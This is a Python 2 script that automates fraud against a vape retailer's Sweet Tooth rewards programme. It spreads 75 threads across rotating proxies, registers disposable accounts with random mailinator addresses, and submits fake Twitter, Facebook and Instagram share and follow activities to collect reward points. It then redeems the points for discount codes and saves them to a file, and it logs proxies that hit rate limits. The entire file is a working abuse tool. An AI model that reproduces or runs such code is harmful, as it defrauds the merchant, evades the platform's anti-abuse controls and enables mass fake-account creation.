# -*- coding: utf-8 -*-
import requests
import re
import Queue
import random
import codecs
from time import sleep
from threading import Thread

proxy = '127.0.0.1:8888'
requests.packages.urllib3.disable_warnings()

chi = '20057'
pprod = '58851'
ai = '20051'
url = 'https://www.eightvape.com/'
poi = '500'

with codecs.open('Proxies Working.txt', 'r', encoding='utf-8') as f:
	proxies = f.readlines()
def check():
	while True:
		try:
			proxy = random.choice(proxies)
			prozy = {
				'http': proxy.strip(),
				'https': proxy.strip()
			}
			s = requests.session()
			user = str(random.randint(99999999,99999999999))
			work = False
			s.cookies.clear()
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
				'Accept-Encoding': 'gzip',
				'Content-Type': 'application/x-www-form-urlencoded'
			}
			r = s.post(
						url + 'account',
						data='form_type=create_customer&utf8=%E2%9C%93&customer%5Bfirst_name%5D=cyka&customer%5Blast_name%5D=blyat&customer%5Bemail%5D={0}@mailinator.com&customer%5Bpassword%5D=playtime2'.format(user),
						verify=False,
						proxies=prozy,
						headers=headers
					)
			if 'My Account' in r.text:
				print 'Account made!'
				api = re.findall('data-channel-api-key="(.*?)"', r.text)[0]
				cid = re.findall('data-external-customer-id="(.*?)"', r.text)[0]
				dig = re.findall('data-customer-auth-digest="(.*?)"', r.text)[0]
				
				r = s.get(
							'https://cdn.sweettooth.io/v1/storefront_js/init?callback=stInitCallback&external_customer_id={0}&channel_api_key={1}&customer_auth_digest={2}'.format(cid, api, dig),
							verify=False,
							proxies=prozy,
							headers=headers
						)
						
				auth = re.findall('customer_authentication_token":"(.*?)"', r.text)[0]

				r = s.post(
							'https://storefront.sweettooth.io/api/v1/customers/sign_in',
							data='customer%5Bauthentication_token%5D={0}&customer%5Bcustomer_id%5D='.format(auth),
							verify=False,
							proxies=prozy,
							headers=headers
				)
				caid = re.findall('customer_id":(.*?),', r.text)[0]
				
				headers = {
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
					'Accept-Encoding': 'gzip',
					'Content-Type': 'application/json; charset=UTF-8',
					'X-Requested-With': 'XMLHttpRequest',
					'Authorization': 'Token ' + auth,
					'Referer': 'https://storefront.sweettooth.io/purchase/' + pprod + '?accountId=' + ai + '&channelId=' + chi + '&ct='+caid
				}
				r = s.post(
							'https://storefront.sweettooth.io/api/v1/activities',
							data='{"activity":{"activity_type":"twitter_share","channel_id":' + chi + '}}',
							verify=False,
							proxies=prozy,
							headers=headers
				)
				r = s.post(
							'https://storefront.sweettooth.io/api/v1/activities',
							data='{"activity":{"activity_type":"facebook_share","channel_id":' + chi + '}}',
							verify=False,
							proxies=prozy,
							headers=headers
				)
				r = s.post(
							'https://storefront.sweettooth.io/api/v1/activities',
							data='{"activity":{"activity_type":"instagram_follow","channel_id":' + chi + '}}',
							verify=False,
							proxies=prozy,
							headers=headers
				)
				r = s.post(
							'https://storefront.sweettooth.io/api/v1/activities',
							data='{"activity":{"activity_type":"twitter_follow","channel_id":' + chi + '}}',
							verify=False,
							proxies=prozy,
							headers=headers
				)
				r = s.post(
							'https://storefront.sweettooth.io/api/v1/activities',
							data='{"activity":{"activity_type":"facebook_like","channel_id":' + chi + '}}',
							verify=False,
							proxies=prozy,
							headers=headers
				)
			
				sleep(3.2)
				r = s.get(
							'https://storefront.sweettooth.io/api/v1/points_products?account_id=' + ai + '&include=promo',
							verify=False,
							proxies=prozy,
							headers=headers
				)
				r = s.put(
							'https://storefront.sweettooth.io/api/v1/new_points_products/' + pprod + '/purchase',
							data='{"customer_id":"'+caid+'","points_to_spend":' + poi + '}',
							verify=False,
							proxies=prozy,
							headers=headers
				)
				code = re.findall('code":"(.*?)",', r.text)[0]
				f = open("codes.txt", "a")
				f.write('{0}\n'.format(code))
				f.close()
				print "Code:", code
			if 'Too many attempts' in r.text:
				f = open("Challenge.txt", "a")
				f.write('{0}'.format(proxy))
				f.close()
				#print 'Challenge'
		except Exception, e:
			#print e
			pass
	
def main():
	for _ in range(int(75)):
		worker = Thread(target=check, args=())
		worker.start()
if __name__ == '__main__':
	main()